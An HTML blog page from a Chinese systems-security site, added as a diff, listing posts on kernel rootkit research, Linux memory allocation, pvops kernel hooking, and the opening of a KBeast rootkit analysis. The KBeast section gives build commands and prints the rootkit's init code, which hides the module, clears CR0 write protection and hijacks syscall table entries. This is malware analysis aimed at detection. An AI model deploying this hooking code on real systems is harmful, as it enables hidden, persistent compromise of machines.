@@ -1,0 +1,498 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>善守者</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="Diting0x@">
+<meta property="og:type" content="website">
+<meta property="og:title" content="善守者">
+<meta property="og:url" content="http://yoursite.com/page/2/index.html">
+<meta property="og:site_name" content="善守者">
+<meta property="og:description" content="Diting0x@">
+<meta property="og:locale" content="zh-CN">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="善守者">
+<meta name="twitter:description" content="Diting0x@">
+  
+  
+  <link href="/webfonts/ptserif/main.css" rel='stylesheet' type='text/css'>
+  <link href="/webfonts/source-code-pro/main.css" rel="stylesheet" type="text/css">
+  <link rel="stylesheet" href="/css/style.css">
+  
+
+</head>
+
+<body>
+  <div id="container">
+    <header id="header">
+  <div id="header-outer" class="outer">
+    <div id="header-inner" class="inner">
+      <a id="main-nav-toggle" class="nav-icon" href="javascript:;"></a>
+      <a id="logo" class="logo" href="/"></a>
+      <nav id="main-nav">
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+          <a class="main-nav-link" href="/categories">Categories</a>
+        
+          <a class="main-nav-link" href="/tags">Tags</a>
+        
+          <a class="main-nav-link" href="/about">About</a>
+        
+          <a class="main-nav-link" href="/atom.xml">Rss</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        <div id="search-form-wrap">
+          <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://yoursite.com"></form>
+        </div>
+      </nav>
+    </div>
+  </div>
+</header>
+    <section id="main" class="outer">
+      <article id="post-kernelmalware" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/20170330/kernelmalware/">内核层恶意代码分析</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-meta">
+      <a href="/20170330/kernelmalware/" class="article-date">
+  <time datetime="2017-03-30T06:13:41.000Z" itemprop="datePublished">2017-03-30</time>
+</a>
+      
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/恶意代码/">恶意代码</a>
+  </div>
+
+      
+    </div>
+    <div class="article-entry" itemprop="articleBody">
+      
+        <hr>
+<p>作者：<a href="http://weibo.com/diting0x/profile?rightmod=1&amp;wvr=6&amp;mod=personinfo&amp;is_all=1" target="_blank" rel="external">Diting0x</a></p>
+<p><strong>转载本文请务必注明</strong>，文章出处：《<a href="http://www.csyssec.org/20170330/kernelmalware" target="_blank" rel="external">内核层恶意代码分析</a>》与作者信息：<a href="http://www.csyssec.org/about/" target="_blank" rel="external">CSysSec出品</a></p>
+<hr>
+<p>本文旨在收集Linux下内核层恶意代码并进行分析，持续更新。</p>
+<ul>
+<li>来源于论文<a href="https://www.cerias.purdue.edu/assets/pdf/bibtex_archive/2010-02.pdf" target="_blank" rel="external">LiveDM: Temporal Mapping of Dynamic Kernel Memory for Dynamic Kernel Malware Analysis and Debugging, </a>rootkit操纵内核动态对象的分析结果：</li>
+</ul>
+<figure><br>    <a href="http://oij0laovn.bkt.clouddn.com/livedm1.png" target="_blank" rel="external"><img src="http://oij0laovn.bkt.clouddn.com/livedm1.png" width="450"></a><br>    <figcaption></figcaption><br></figure>
+
+<ul>
+<li>来源于论文<a href="http://friends.cs.purdue.edu/pubs/eurosys09.pdf" target="_blank" rel="external">Multi-Aspect Profiling of Kernel Rootkit Behavior, EuroSys’09</a>中PoKeR系统对rootkit行为的分析结果：</li>
+</ul>
+<figure><br>    <a href="http://oij0laovn.bkt.clouddn.com/pokerresult.png" target="_blank" rel="external"><img src="http://oij0laovn.bkt.clouddn.com/pokerresult.png" width="450"></a><br>    <figcaption></figcaption><br></figure>
+
+<ul>
+<li>来源于论文<a href="http://www.cs.umd.edu/~mwh/papers/sbcfi.pdf" target="_blank" rel="external">Automated Detection of Persistent Kernel<br>Control-Flow Attacks,CCS’07</a>对内核层恶意代码的行为以及利用的机制分析结果：</li>
+</ul>
+<figure><br>    <a href="http://oij0laovn.bkt.clouddn.com/sbcfi.png" target="_blank" rel="external"><img src="http://oij0laovn.bkt.clouddn.com/sbcfi.png" width="450"></a><br>    <figcaption></figcaption><br></figure>
+
+
+<ul>
+<li>部分用于研究目的的内核层恶意代码源码分享，可以参考<a href="https://github.com/chonghw/research-malware" target="_blank" rel="external">这里</a></li>
+</ul>
+<hr>
+<p>作者：<a href="http://weibo.com/diting0x/profile?rightmod=1&amp;wvr=6&amp;mod=personinfo&amp;is_all=1" target="_blank" rel="external">Diting0x</a></p>
+<p><strong>转载本文请务必注明</strong>，文章出处：《<a href="http://www.csyssec.org/20170330/kernelmalware" target="_blank" rel="external">内核层恶意代码分析</a>》与作者信息：<a href="http://www.csyssec.org/about/" target="_blank" rel="external">CSysSec出品</a></p>
+
+      
+    </div>
+    
+    
+      <footer class="article-footer">
+        
+  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Malware/">Malware</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Rootkit/">Rootkit</a></li></ul>
+
+      </footer>
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+
+    
+      <article id="post-kernel-malloc" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/20170301/kernel-malloc/">深入理解Linux内存分配</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-meta">
+      <a href="/20170301/kernel-malloc/" class="article-date">
+  <time datetime="2017-03-01T05:22:46.000Z" itemprop="datePublished">2017-03-01</time>
+</a>
+      
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/系统内核/">系统内核</a>
+  </div>
+
+      
+    </div>
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>作者：<a href="http://weibo.com/diting0x" target="_blank" rel="external">Diting0x</a></p>
+<hr>
+<p><strong>CSysSec注</strong>： 本文来自<a href="http://www.chongh.wiki/about/" target="_blank" rel="external">Diting0x</a>的<a href="http://www.chongh.wiki/blog/2016/05/03/linux-memory-alloc/" target="_blank" rel="external">个人博客</a>，主要介绍了Linux内核中一系列的内存分配函数及其原理<br><strong>转载本文请务必注明</strong>，文章出处：《<a href="http://www.csyssec.org/20170301/kernel-malloc/" target="_blank" rel="external">深入理解Linux内核分配</a>》与作者信息：<a href="http://weibo.com/diting0x" target="_blank" rel="external">Diting0x</a></p>
+<hr>
+<p>为了写一个用户层程序，你也许会声明一个全局变量，这个全局变量可能是一个int类型也可能是一个数组，而声明之后你有可能会先初始化它，也有可能放在之后用到它的时候再初始化。除此之外，你有可能会选择在函数内部去声明局部变量，又或者为变量动态申请内存。</p>
+        
+          <p class="article-more-link">
+            <a href="/20170301/kernel-malloc/#more">Read More</a>
+          </p>
+        
+      
+    </div>
+    
+    
+      <footer class="article-footer">
+        
+  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Kernel/">Kernel</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/System/">System</a></li></ul>
+
+      </footer>
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+
+    
+      <article id="post-pvops" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/20170301/pvops/">Hook内核之PVOPS</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-meta">
+      <a href="/20170301/pvops/" class="article-date">
+  <time datetime="2017-03-01T05:19:20.000Z" itemprop="datePublished">2017-03-01</time>
+</a>
+      
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/系统内核/">系统内核</a>
+  </div>
+
+      
+    </div>
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>作者：<a href="http://weibo.com/diting0x" target="_blank" rel="external">Diting0x</a></p>
+<hr>
+<p><strong>CSysSec注</strong>： 本文来自<a href="http://www.chongh.wiki/about/" target="_blank" rel="external">Diting0x</a>的<a href="http://www.chongh.wiki/blog/2016/05/03/pvops/" target="_blank" rel="external">个人博客</a>，讲述在虚拟化平台下如何利用PVOPS框架来hook内核<br><strong>转载本文请务必注明</strong>，文章出处：《<a href="http://www.csyssec.org/20170301/pvops/" target="_blank" rel="external">Hook内核之PVOPS</a>》与作者信息：<a href="http://weibo.com/diting0x" target="_blank" rel="external">Diting0x</a></p>
+<hr>
+<p>pvops是做什么的？ 简单地说，hook kernel.<br>利用pvops你可以自定义自己的write_cr3函数，你可以修改页表，追踪页表更新的信息，而这些听起来非常底层的操作，利用pvops都变得简单起来。</p>
+<p>pvops接口来源于Xen项目，初衷是建立一个类虚拟化(para-virtualized）内核来适应于不同的hypervisor，当然也包括适应于非虚拟化平台。</p>
+<p>pvops将类虚拟化操作分成一系列结构：pv_time_ops,pv_cpu_ops,pv_mmu_ops,pv_lock_ops和pv_irq_ops。</p>
+<p>举个例子，x86系统中利用’MOV CR3’指令来加载页表。pvops将其替换为一个间接跳转到pv_mmu_ops -&gt; write_cr3函数。 每种虚拟化系统，包括本地x86平台，对这些函数都有自己的实现。 对于x86平台，这些函数的实现只是简单地对原始函数指令的封装。比如对于pv_mmu_ops -&gt; write_cr3函数，x86平台的具体实现为native_write_cr3函数：</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"></div><div class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">void</span> <span class="title">native_write_cr3</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">long</span> val)</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">        asm volatile("mov %0,%%cr3": : "r" (val), "m" (__force_order));</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p>pvops将本地底层的硬件指令通过pv_xxx_ops结构体替换为间接跳转函数。下面以pv_mmu_ops为例，详细分析其内部结构，pv_mmu_ops的定义为：(文中列出主要部分，完整定义，可参看<a href="http://lxr.free-electrons.com/source/arch/x86/kernel/paravirt.c#L395" target="_blank" rel="external">pv_mmu_ops结构定义</a>）</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div></pre></td><td class="code"><pre><div class="line"></div><div class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pv_mmu_ops</span> &#123;</span></div><div class="line">         <span class="function"><span class="keyword">unsigned</span> <span class="title">long</span> <span class="params">(*read_cr2)</span><span class="params">(<span class="keyword">void</span>)</span></span>;</div><div class="line">         <span class="keyword">void</span> (*write_cr2)(<span class="keyword">unsigned</span> <span class="keyword">long</span>);</div><div class="line"> </div><div class="line">         <span class="function"><span class="keyword">unsigned</span> <span class="title">long</span> <span class="params">(*read_cr3)</span><span class="params">(<span class="keyword">void</span>)</span></span>;</div><div class="line">         <span class="keyword">void</span> (*write_cr3)(<span class="keyword">unsigned</span> <span class="keyword">long</span>);</div><div class="line"> </div><div class="line">         <span class="comment">/*</span></div><div class="line"><span class="comment">          * Hooks for intercepting the creation/use/destruction of an</span></div><div class="line"><span class="comment">          * mm_struct.</span></div><div class="line"><span class="comment">          */</span></div><div class="line">         <span class="keyword">void</span> (*activate_mm)(struct mm_struct *prev,</div><div class="line">                             struct mm_struct *next);</div><div class="line">         <span class="keyword">void</span> (*dup_mmap)(struct mm_struct *oldmm,</div><div class="line">                          struct mm_struct *mm);</div><div class="line">         <span class="keyword">void</span> (*exit_mmap)(struct mm_struct *mm);</div><div class="line"> </div><div class="line"> </div><div class="line">         <span class="comment">/* TLB operations */</span></div><div class="line">         <span class="keyword">void</span> (*flush_tlb_user)(<span class="keyword">void</span>);</div><div class="line">         <span class="keyword">void</span> (*flush_tlb_kernel)(<span class="keyword">void</span>);</div><div class="line">         <span class="keyword">void</span> (*flush_tlb_single)(<span class="keyword">unsigned</span> <span class="keyword">long</span> addr);</div><div class="line">         <span class="keyword">void</span> (*flush_tlb_others)(<span class="keyword">const</span> struct cpumask *cpus,</div><div class="line">                                  struct mm_struct *mm,</div><div class="line">                                  <span class="keyword">unsigned</span> <span class="keyword">long</span> start,</div><div class="line">                                  <span class="keyword">unsigned</span> <span class="keyword">long</span> end);</div><div class="line"> </div><div class="line">         <span class="comment">/* Hooks for allocating and freeing a pagetable top-level */</span></div><div class="line">         <span class="keyword">int</span>  (*pgd_alloc)(struct mm_struct *mm);</div><div class="line">         <span class="keyword">void</span> (*pgd_free)(struct mm_struct *mm, <span class="keyword">pgd_t</span> *pgd);</div><div class="line"> </div><div class="line">         <span class="comment">/*</span></div><div class="line"><span class="comment">          * Hooks for allocating/releasing pagetable pages when they're</span></div><div class="line"><span class="comment">          * attached to a pagetable</span></div><div class="line"><span class="comment">          */</span></div><div class="line">         <span class="keyword">void</span> (*alloc_pte)(struct mm_struct *mm, <span class="keyword">unsigned</span> <span class="keyword">long</span> pfn);</div><div class="line">         <span class="keyword">void</span> (*alloc_pmd)(struct mm_struct *mm, <span class="keyword">unsigned</span> <span class="keyword">long</span> pfn);</div><div class="line">         <span class="keyword">void</span> (*alloc_pud)(struct mm_struct *mm, <span class="keyword">unsigned</span> <span class="keyword">long</span> pfn);</div><div class="line">         <span class="keyword">void</span> (*release_pte)(<span class="keyword">unsigned</span> <span class="keyword">long</span> pfn);</div><div class="line">         <span class="keyword">void</span> (*release_pmd)(<span class="keyword">unsigned</span> <span class="keyword">long</span> pfn);</div><div class="line">         <span class="keyword">void</span> (*release_pud)(<span class="keyword">unsigned</span> <span class="keyword">long</span> pfn);</div><div class="line"> </div><div class="line">         <span class="comment">/* Pagetable manipulation functions */</span></div><div class="line">         <span class="keyword">void</span> (*set_pte)(<span class="keyword">pte_t</span> *ptep, <span class="keyword">pte_t</span> pteval);</div><div class="line">         <span class="keyword">void</span> (*set_pte_at)(struct mm_struct *mm, <span class="keyword">unsigned</span> <span class="keyword">long</span> addr,</div><div class="line">                            <span class="keyword">pte_t</span> *ptep, <span class="keyword">pte_t</span> pteval);</div><div class="line">         <span class="keyword">void</span> (*set_pmd)(<span class="keyword">pmd_t</span> *pmdp, <span class="keyword">pmd_t</span> pmdval);</div><div class="line">         <span class="keyword">void</span> (*set_pmd_at)(struct mm_struct *mm, <span class="keyword">unsigned</span> <span class="keyword">long</span> addr,</div><div class="line">                            <span class="keyword">pmd_t</span> *pmdp, <span class="keyword">pmd_t</span> pmdval);</div><div class="line">         <span class="keyword">void</span> (*pte_update)(struct mm_struct *mm, <span class="keyword">unsigned</span> <span class="keyword">long</span> addr,</div><div class="line">                            <span class="keyword">pte_t</span> *ptep);</div><div class="line"> </div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p>比如说你要在分配页表项的时候hook (<em>write_cr3)函数, 可以将(</em>write_cr3)函数赋值为自己的自定义函数。 默认情况下，内核中pvops框架中提供的自定义函数如下： (完整可参看 <a href="http://lxr.free-electrons.com/source/arch/x86/kernel/paravirt.c#L395" target="_blank" rel="external">pv_mmu_ops函数定义</a>)</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pv_mmu_ops</span> <span class="title">pv_mmu_ops</span> &#123;</span></div><div class="line"></div><div class="line">.read_cr2 = native_read_cr2,</div><div class="line">.write_cr2 = native_write_cr2,</div><div class="line">.read_cr3 = native_read_cr3,</div><div class="line">.write_cr3 = native_write_cr3,</div><div class="line"> .alloc_pte = paravirt_nop,</div><div class="line">.alloc_pmd = paravirt_nop,</div><div class="line">.alloc_pud = paravirt_nop,</div><div class="line">.release_pte = paravirt_nop,</div><div class="line">.release_pmd = paravirt_nop,</div><div class="line">.release_pud = paravirt_nop,</div><div class="line"></div><div class="line">.set_pte = native_set_pte,</div><div class="line">.set_pte_at = native_set_pte_at,</div><div class="line">.set_pmd = native_set_pmd,</div><div class="line">.set_pmd_at = native_set_pmd_at,</div><div class="line">.pte_update = paravirt_nop,</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p>接着定义的函数会被传入到这里：</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"></div><div class="line"> <span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">void</span> <span class="title">write_cr3</span><span class="params">(struct mm_struct *mm, <span class="keyword">unsigned</span> <span class="keyword">long</span> pfn)</span></span></div><div class="line"><span class="function"> </span>&#123;</div><div class="line">         PVOP_VCALL2(pv_mmu_ops.write_cr3, mm, pfn);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p>至于PVOP_VCALL2具体做了什么，可以不必去关心。</p>
+<p>完</p>
+<hr>
+<p><strong>转载本文请务必注明</strong>，文章出处：《<a href="http://www.csyssec.org/20170301/pvops/" target="_blank" rel="external">Hook内核之PVOPS</a>》与作者信息：<a href="http://weibo.com/diting0x" target="_blank" rel="external">Diting0x</a></p>
+<hr>
+
+      
+    </div>
+    
+    
+      <footer class="article-footer">
+        
+  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Kernel/">Kernel</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/System/">System</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Virtualization/">Virtualization</a></li></ul>
+
+      </footer>
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+
+    
+      <article id="post-kbeastanalysis" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/20170104/kbeastanalysis/">内核层恶意代码KBeast分析与检测</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-meta">
+      <a href="/20170104/kbeastanalysis/" class="article-date">
+  <time datetime="2017-01-04T08:12:27.000Z" itemprop="datePublished">2017-01-04</time>
+</a>
+      
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/恶意代码/">恶意代码</a>
+  </div>
+
+      
+    </div>
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>作者：<a href="http://weibo.com/diting0x" target="_blank" rel="external">Diting0x</a></p>
+<hr>
+<p><strong>CSysSec注</strong>： 本文来自<a href="http://www.chongh.wiki/about/" target="_blank" rel="external">Diting0x</a>的<a href="http://www.chongh.wiki/blog/2016/04/03/kbeast-analysis-detection/" target="_blank" rel="external">个人博客</a>，该文深入分析了KBeast的原理以及源代码，并给出了检测KBeast实验方法，KBeast是学习内核层恶意代码不错的样本。<br><strong>转载本文请务必注明</strong>，文章出处：《<a href="http://www.csyssec.org/20170104/kbeastanalysis/" target="_blank" rel="external">内核层恶意代码KBeast分析与检测</a>》与作者信息：<a href="http://weibo.com/diting0x" target="_blank" rel="external">Diting0x</a></p>
+<hr>
+<blockquote>
+<ul>
+<li>0x01 全文环境</li>
+<li>0X02 Kbeast 特性</li>
+<li>0X03 系统调用劫持基础</li>
+<li>0X04 Kbeast 使用</li>
+<li>0X05 Kbeast 核心</li>
+<li>0X06 Libvmi and Volatility检测KBeast</li>
+</ul>
+</blockquote>
+<hr>
+<h3 id="0x01-全文环境"><a href="#0x01-全文环境" class="headerlink" title="0x01 全文环境"></a>0x01 全文环境</h3><p>Host Ubuntu 12.04 + Guest Ubuntu 10.04/11.04 + Libvmi + Volatility</p>
+<p>其中Kbeast运行在Guest Ubuntu 10.04/11.04中，libvmi与volatility运行在Host Ubuntu12.04中。</p>
+<h3 id="0X02-Kbeast-特性"><a href="#0X02-Kbeast-特性" class="headerlink" title="0X02 Kbeast 特性"></a>0X02 Kbeast 特性</h3><p>以下是Kbeast实现的功能：</p>
+<ul>
+<li>隐藏可加载模块（LKM)</li>
+<li>隐藏文件/目录</li>
+<li>隐藏进程（ps,pstree,top,lsof)</li>
+<li>隐藏套接字和网络连接(netstat,lsof)</li>
+<li>记录键盘操作捕获用户行为</li>
+<li>反杀死进程</li>
+<li>反移除文件</li>
+<li>反删除可加载模块</li>
+<li>root提权后门</li>
+<li>远程绑定后门 </li>
+</ul>
+<h3 id="0X03-系统调用劫持基础"><a href="#0X03-系统调用劫持基础" class="headerlink" title="0X03 系统调用劫持基础"></a>0X03 系统调用劫持基础</h3><p>上述的Kbeast特性都是通过系统调用劫持实现的。在kernel 2.6.*之前，系统调用表”sys_call_table”是可以直接导出引用的，如：</p>
+<pre><code>extern void *sys_call_table[];
+sys_call_table[__NR_syscall] = pointer
+</code></pre><p>而在kernel 2.6.* 之后禁用了这种特性，并且其所在页是写保护的。然而，系统调用表依然在内存中，如果知道其所在内存地址，依然可以通过指针访问。内核中的符号表System.map （一般在/boot/目录下)记录了所有的符号及其地址，当然也包括系统调用表”sys_call_table”.  以Ubuntu 10.04为例，执行：</p>
+<pre><code>grep sys_call_table /boot/System.map-2.6.32-21-generic
+</code></pre><p>显示的结果为</p>
+<pre><code>c0592150 R sys_call_table
+</code></pre><p>c0592150指的是线性地址，R说明此地址所在的页面Read-only。目前的CPU都会将CR0控制寄存器的第16位（wp-bit）置1,将页面开启保护模式，这时CPU处于”write-proteed”模式，否则处于”read/write”模式。CR0寄存器的位描述可参考<a href="https://en.wikipedia.org/wiki/Control_register#CR0" target="_blank" rel="external">CR0</a>. </p>
+<p>如果能将WP位置0，就可以访问内存页面,读写系统调用表了。 下面这行代码便可实现此功能：</p>
+<pre><code>write_cr0 (read_cr0 () &amp; (~ 0x10000));
+</code></pre><h3 id="0X04-Kbeast-使用"><a href="#0X04-Kbeast-使用" class="headerlink" title="0X04 Kbeast 使用"></a>0X04 Kbeast 使用</h3><p>下载<a href="https://packetstormsecurity.com/files/108286/KBeast-Kernel-Beast-Linux-Rootkit-2012.html" target="_blank" rel="external">Kbeast</a>. </p>
+<pre><code>tar xzf ipsecs-kbeast-v1.tar.gz
+cd kbeast-v1
+./setup build 1  
+</code></pre><p>具体可参考/kbeast-v1/setup 文件，参数1表示默认为kernel 2.6.32。测试过ubuntu11.04 内核为2.6.38，setup出错，作者声称：<br>Be kind to note that the beast has been tested in, but not limited to, kernel 2.6.9,<br>2.6.16, 2.6.18, 2.6.32, 2.6.35 (i386 or x86_64)，理论上只要修改setup相关参数以及ipsecs-kbeast-vl.c文件中的系统调用表的地址即可适应其它版本内核，未测试。</p>
+<p>成功编译后，kbeast就会加载到内核空间，rootkit安装在/usr/<em>h4x</em>路径下，生成/usr/<em>h4x</em>/_h4x_bd进程，以及acctlog 记录文件， 路径以及文件名等参数可以在config.h文件中配置。当然在目标机器guest中无法找到相关文件，因为已经被隐藏了。下文会利用volatility检测到相关进程的路径。</p>
+<h3 id="0X05-Kbeast-核心"><a href="#0X05-Kbeast-核心" class="headerlink" title="0X05 Kbeast 核心"></a>0X05 Kbeast 核心</h3><p>Kbeast以LKM的方式存在，以下是其核心代码：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div></pre></td><td class="code"><pre><div class="line"></div><div class="line"><span class="comment">/*init module insmod*/</span></div><div class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">init</span><span class="params">(<span class="keyword">void</span>)</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">  <span class="comment">//Uncomment to hide this module</span></div><div class="line">  list_del_init(&amp;__this_module.<span class="built_in">list</span>);</div><div class="line"></div><div class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">tcp_seq_afinfo</span> *<span class="title">my_afinfo</span> = <span class="title">NULL</span>;</span></div><div class="line">  <span class="comment">//proc_net is disappeared in 2.6.32, use init_net.proc_net</span></div><div class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">proc_dir_entry</span> *<span class="title">my_dir_entry</span> = <span class="title">init_net</span>.<span class="title">proc_net</span>-&gt;<span class="title">subdir</span>;</span>  </div><div class="line"></div><div class="line">  write_cr0 (read_cr0 () &amp; (~ <span class="number">0x10000</span>));</div><div class="line">  <span class="keyword">if</span>(_KEYLOG_)&#123;</div><div class="line">    o_read=(<span class="keyword">void</span> *)sys_call_table[__NR_read];</div><div class="line">    sys_call_table[__NR_read]=h4x_read;</div><div class="line">  &#125;</div><div class="line">  o_write=(<span class="keyword">void</span> *)sys_call_table[__NR_write];</div><div class="line">  sys_call_table[__NR_write]=h4x_write;</div><div class="line">  <span class="meta">#<span class="meta-keyword">if</span> defined(__x86_64__)</span></div><div class="line">    o_getdents=sys_call_table [__NR_getdents];</div><div class="line">    sys_call_table [__NR_getdents]=h4x_getdents;</div><div class="line">  <span class="meta">#<span class="meta-keyword">elif</span> defined(__i386__)</span></div><div class="line">    o_getdents64=sys_call_table [__NR_getdents64];</div><div class="line">    sys_call_table [__NR_getdents64]=h4x_getdents64;</div><div class="line">  <span class="meta">#<span class="meta-keyword">else</span></span></div><div class="line">    <span class="meta">#<span class="meta-keyword">error</span> Unsupported architecture</span></div><div class="line">  <span class="meta">#<span class="meta-keyword">endif</span></span></div><div class="line">  o_unlink = sys_call_table [__NR_unlink];</div><div class="line">  sys_call_table [__NR_unlink] = h4x_unlink;</div><div class="line">  o_rmdir = sys_call_table [__NR_rmdir];</div><div class="line">  sys_call_table [__NR_rmdir] = h4x_rmdir;</div><div class="line">  o_unlinkat = sys_call_table [__NR_unlinkat];</div><div class="line">  sys_call_table [__NR_unlinkat] = h4x_unlinkat;</div><div class="line">  o_rename = sys_call_table [__NR_rename];</div><div class="line">  sys_call_table [__NR_rename] = h4x_rename;</div><div class="line">  o_open = sys_call_table [__NR_open];</div><div class="line">  sys_call_table [__NR_open] = h4x_open;</div><div class="line">  o_kill = sys_call_table [__NR_kill];</div><div class="line">  sys_call_table [__NR_kill] = h4x_kill;</div><div class="line">  o_delete_module = sys_call_table [__NR_delete_module];</div><div class="line">  sys_call_table [__NR_delete_module] = h4x_delete_module;</div><div class="line">  write_cr0 (read_cr0 () | <span class="number">0x10000</span>);</div><div class="line"></div><div class="line">  <span class="keyword">while</span>(<span class="built_in">strcmp</span>(my_dir_entry-&gt;name, <span class="string">"tcp"</span>))</div><div class="line">    my_dir_entry = my_dir_entry-&gt;next;</div><div class="line">  <span class="keyword">if</span>((my_afinfo = (struct tcp_seq_afinfo*)my_dir_entry-&gt;data))</div><div class="line">  &#123;</div><div class="line">    <span class="comment">//seq_show is disappeared in 2.6.32, use seq_ops.show</span></div><div class="line">    old_tcp4_seq_show = my_afinfo-&gt;seq_ops.show;</div><div class="line">    my_afinfo-&gt;seq_ops.show = h4x_tcp4_seq_show;</div><div class="line">  &#125;</div><div class="line">  <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p>首先将模块隐藏，取消CR0写保护，找到系统调用表地址，将其处理函数换成自己的函数，分别对应其中的特性。 如：</p>
